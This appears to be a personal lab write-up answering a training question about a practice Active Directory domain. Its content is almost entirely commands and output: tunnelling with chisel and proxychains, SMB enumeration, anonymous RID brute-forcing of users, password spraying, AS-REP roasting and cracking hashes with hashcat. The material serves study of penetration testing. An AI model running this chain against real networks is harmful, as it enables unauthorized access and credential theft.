1. What's the password of the account you found?

```sh
# Connect to chisel server on target machine
sudo chisel client 10.129.204.182:8080 socks

2026/02/26 15:08:50 client: Connecting to ws://10.129.204.182:8080
2026/02/26 15:08:50 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2026/02/26 15:08:51 client: Connected (Latency 71.192721ms)


# Update the config file
tail -n 5 /etc/proxychains.conf

# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 	127.0.0.1 1080


# Get all of the live target in the network at the moment of the scan
sudo proxychains -q crackmapexec smb 172.16.15.0/24  

SMB         172.16.15.15    445    SQL01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00



# Get all hosts with signing disabled
sudo proxychains -q crackmapexec smb 172.16.15.0/24  --gen-relay-list relaylistOutputFilename.txt

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.15    445    SQL01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00


# Then read the file
cat relaylistOutputFilename.txt 

172.16.15.15
172.16.15.20


# Enumerate the password policy and save the result to a file as a json file
sudo proxychains -q crackmapexec smb 172.16.15.15 -u '' -p '' --pass-pol --log $(pwd)/passpol.txt

SMB         172.16.15.15    445    SQL01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.15    445    SQL01            [-] INLANEFREIGHT.LOCAL\: STATUS_ACCESS_DENIED 


# Can I try the DC?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u '' -p '' --pass-pol --log $(pwd)/passpol.txt

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\: 


# Nope. The other?
sudo proxychains -q crackmapexec smb 172.16.15.20 -u '' -p '' --pass-pol

SMB         172.16.15.20    445    DEV01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.15.20    445    DEV01            [-] INLANEFREIGHT.LOCAL\: STATUS_ACCESS_DENIED 


# Guest account disabled too. Everywhere
sudo proxychains -q crackmapexec smb 172.16.15.3 -u 'guest' -p '' --pass-pol

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [-] INLANEFREIGHT.LOCAL\guest: STATUS_ACCOUNT_DISABLED 


# Ok. Can we brute force the users?
sudo proxychains -q crackmapexec smb 172.16.15.3 -u '' -p '' --users

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\: 


# Nope. rid-brute? Incread to 10000 just in case
sudo proxychains -q crackmapexec smb 172.16.15.3 -u '' -p '' --rid-brute 10000 --log $(pwd)/users.txt

SMB         172.16.15.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\: 
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\Administrator (SidTypeUser)
501: INLANEFREIGHT\Guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
...

# Open vi > gg > ctrl + v > G > d  To get this
INLANEFREIGHT\Administrator (SidTypeUser)
INLANEFREIGHT\Guest (SidTypeUser)
INLANEFREIGHT\krbtgt (SidTypeUser)
INLANEFREIGHT\Domain Admins (SidTypeGroup)
INLANEFREIGHT\Domain Users (SidTypeGroup)


# Then
cut -d "(" -f 1 users.txt > temp_users.txt

head temp_users.txt

INLANEFREIGHT\Administrator 
INLANEFREIGHT\Guest 
INLANEFREIGHT\krbtgt 
INLANEFREIGHT\Domain Admins 
INLANEFREIGHT\Domain Users 
INLANEFREIGHT\Domain Guests 
INLANEFREIGHT\Domain Computers 
INLANEFREIGHT\Domain Controllers 


# Then remove the domain
cut -d "\\" -f 2 temp_users.txt  > final_users.txt

Administrator 
Guest 
krbtgt 
Domain Admins 
Domain Users 
Domain Guests 
...

# Ok. Now we need to remove the machines. Didn't find the unix way. Had to do it manually. 
wc -l final_users.txt 

872 final_users.txt


# Remove duplicates if needed
# sort final_users.txt  | uniq  > clean_users.txt
# wc -l clean_users.txt 
# 301 clean_users.txt


# Update the hosts file
sudo vi /etc/hosts

172.16.15.3 dc01.inlanefreight.htb dc01


# Find an account vulnerable to asreproast without credentials
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u final_users.txt -p '' --asreproast asreproast.out

...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
...


# Taking too long. Can I password spray? Create a Passwords list
cat passwords.txt

Inlanefreight01!
Inlanefreight02!
Inlanefreight03!


# Password Attack with a List of Usernames and a Password List
sudo proxychains -q crackmapexec smb 172.16.15.3 -u final_users.txt -p passwords.txt --continue-on-success


# No hit. Where TF are the passwords? Asproast just stopping at 5 users. Makes no sense. Ask Google and try the suggested path as well
sudo proxychains4 -q crackmapexec ldap 172.16.15.3 -u final_users.txt -p '' --asreproast asreproast.out --kdcHost DC01.INLANEFREIGHT.LOCAL

...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
LDAP        172.16.15.3     445    DC01             $krb5asrep$23$xxxxxxx@INLANEFREIGHT.LOCAL:678f2e669d85173945f6...5f40e559923
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...


# While that one up was going, I started the second one in parallel
sudo proxychains -q crackmapexec ldap dc01.inlanefreight.htb -u final_users.txt -p '' --asreproast asreproast.out

...
LDAP        172.16.15.3     445    DC01             $krb5asrep$23$xxxxxxx@INLANEFREIGHT.LOCAL:678f2e669d85173945f6...5f40e559923
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)


# Verify
cat asreproast.out 

$krb5asrep$23$xxxxxxx@INLANEFREIGHT.LOCAL:678f2e669d85173945f6...5f40e559923
$krb5asrep$23$xxxxxxx@INLANEFREIGHT.LOCAL:678f2e669d85173945f6...5f40e559923

# Can we crack
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt -O

...
$krb5asrep$23$xxxxxxx@INLANEFREIGHT.LOCAL:678f2e669d85173945f6...5f40e559923:XXXXXX
$krb5asrep$23$xxxxxxx@INLANEFREIGHT.LOCAL:678f2e669d85173945f6...5f40e559923:XXXXXX

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: asreproast.out
Time.Started.....: Thu Feb 26 22:49:12 2026 (0 secs)
Time.Estimated...: Thu Feb 26 22:49:12 2026 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1180.7 kH/s (1.21ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 8192/28688770 (0.03%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#2...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: slimshady -> oooooo

Started: Thu Feb 26 22:49:05 2026
Stopped: Thu Feb 26 22:49:13 2026


# Answer
XXXXXX

# We are in business!!!
```
